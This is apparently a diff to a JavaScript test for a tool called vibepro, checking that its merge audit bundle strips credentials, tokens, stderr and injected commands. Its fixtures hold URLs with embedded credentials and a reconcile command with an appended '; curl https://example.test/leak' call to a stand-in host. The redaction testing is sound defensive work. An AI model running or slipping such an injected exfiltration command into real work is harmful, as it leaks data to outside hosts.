@@ -426,18 +426,25 @@ test('ERM-CONTRACT-004 canonical audit bundle compacts over-budget evidence inst
       status: 'merged',
       base: 'release/2026',
       delivery: { status: 'merged', observed: true },
-      reconciliation: { status: 'reconciliation_required', reasons: ['gate_not_ready'] },
+      reconciliation: {
+        status: 'reconciliation_required',
+        reasons: ['gate_not_ready', 'provider_token=secret']
+      },
       reconciliation_action: {
         status: 'required',
-        reason: 'execution_state_sync_failed',
+        reason: 'provider_token=secret',
         commands: [
           'vibepro pr prepare . --story-id story-compact --base release/2026',
-          'vibepro execute merge . --story-id story-compact --base release/2026 --pr https://github.com/example/repo/pull/1'
-        ]
+          'vibepro execute merge . --story-id story-compact --base release/2026 --pr https://operator:secret@github.com/example/repo/pull/1',
+          'vibepro execute reconcile . --story-id story-compact; curl https://example.test/leak'
+        ],
+        message: 'raw provider response'
       },
       execution_state_sync: {
         status: 'failed',
-        recovery_command: 'vibepro execute reconcile . --story-id story-compact --base release/2026 --pr https://github.com/example/repo/pull/1'
+        reason: 'provider_token=secret',
+        recovery_command: 'vibepro execute reconcile . --story-id story-compact --base release/2026 --pr https://operator:secret@github.com/example/repo/pull/1',
+        details: { stderr: 'secret' }
       },
       decision_outcome_binding: {
         status: 'bound',
@@ -447,7 +454,7 @@ test('ERM-CONTRACT-004 canonical audit bundle compacts over-budget evidence inst
       },
       merged_at: '2026-06-23T00:05:00.000Z',
       merge_commit_sha: 'abc123',
-      pr: { url: 'https://github.com/example/repo/pull/1' }
+      pr: { url: 'https://operator:secret@github.com/example/repo/pull/1' }
     }
   });
   const bundle = promoted.bundle;
@@ -456,6 +463,8 @@ test('ERM-CONTRACT-004 canonical audit bundle compacts over-budget evidence inst
   assert.equal(bundle.merge.reconciliation.status, 'reconciliation_required');
   assert.equal(bundle.merge.base, 'release/2026');
   assert.equal(bundle.merge.reconciliation_action.commands[0], bundle.merge.execution_state_sync.recovery_command);
+  assert.deepEqual(bundle.merge.reconciliation.reasons, ['gate_not_ready', 'merge_reconciliation_required']);
+  assert.doesNotMatch(JSON.stringify(bundle.merge), /operator|secret|provider_token|curl|raw provider response|stderr/);
   assert.equal(bundle.merge.decision_outcome_binding.status, 'bound');
   assert.equal(bundle.artifact_policy.compacted, true);
   assert.equal(bundle.evidence_depth, 'standard');
@@ -478,9 +487,10 @@ test('ERM-CONTRACT-004 canonical audit bundle compacts over-budget evidence inst
   assert.equal(auditIndex.cost_summary.raw_source_artifact_lines > auditIndex.cost_summary.artifact_lines, true);
   assert.equal(auditIndex.pr_prepare.present, true);
   assert.equal(auditIndex.pr_merge.summary.delivery.status, 'merged');
-  assert.deepEqual(auditIndex.pr_merge.summary.reconciliation.reasons, ['gate_not_ready']);
+  assert.deepEqual(auditIndex.pr_merge.summary.reconciliation.reasons, ['gate_not_ready', 'merge_reconciliation_required']);
   assert.equal(auditIndex.pr_merge.summary.base, 'release/2026');
   assert.equal(auditIndex.pr_merge.summary.reconciliation_action.commands[0], auditIndex.pr_merge.summary.execution_state_sync.recovery_command);
+  assert.doesNotMatch(JSON.stringify(auditIndex.pr_merge.summary), /operator|secret|provider_token|curl|raw provider response|stderr/);
   const decisionSummary = await readFile(path.join(root, 'docs', 'management', 'audit-artifacts', storyId, 'decision-summary.md'), 'utf8');
   assert.match(decisionSummary, /pr_merge: merged delivery=merged reconciliation=reconciliation_required reasons=gate_not_ready/);
   assert.equal(auditIndex.pr_merge.summary.decision_outcome_binding.status, 'bound');
